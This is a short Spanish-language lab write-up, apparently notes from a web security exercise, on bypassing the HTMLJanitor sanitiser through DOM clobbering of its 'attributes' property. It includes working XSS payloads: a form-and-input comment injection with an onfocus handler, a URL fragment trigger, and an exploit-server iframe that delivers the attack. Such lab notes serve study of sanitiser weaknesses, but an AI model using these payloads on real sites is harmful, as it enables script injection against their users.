# Bypass de filtros HTML con clobbering DOM

Tags: #XSS-DOM #JavaScript 

```bash 
HTMLJanitor es una librería pensada para filtrar contenido HTML malicioso, limitando los atributos permitidos y bloqueando potenciales vectores XSS. Sin embargo, su lógica interna se basa en comprobar si ciertos atributos están definidos dentro de una colección, y esa colección se accede mediante la propiedad 'attributes'. Lo crítico aquí es que esta propiedad puede ser clobberizada.

- Namednodemap: Es una colección de objetos Attr. Los objetos dentro de un Namednodemap no siguen un orden específico, a diferencia de NodeList, aunque se puede acceder a ellos mediante un índice, como en un array. 
```

```javascript 
// Código general en la página 

	<script src='/resources/js/htmlJanitor.js'></script>
	<script src='/resources/js/loadCommentWithHtmlJanitor.js'></script>
	<script>loadComments('/post/comment')</script>


// Dentro de loadCommentWithHtmlJanitor.js existe una lista blanca (input: {name:true,value:true}, form{id:true},i:{}, b:{}, p:{}) y probar las siguientes inyecciones 

<h1>Hola</h1> probando
<script>alert(0)</script> Se tensa 
<form id=x tabindex=0 onfocus=alert(0)>
<input id=test name=myinput>
</form>
```

```javascript
// Hacer lo siguiente en comentarios 
<form id=x tabindex=0 onfocus=alert(0)><input id=attributes>

// Ahora en la url 
https:web.com/post?postId=1#x

Notas:
	1. Colocar la función print(0) en lugar de alert(0)
```

```javascript 
// Hacer lo siguiente en el exploitserver
<iframe src="https:web.com/post?postId=1" onload="setTimeout(() => this.src +='#x', 500);"></iframe>
```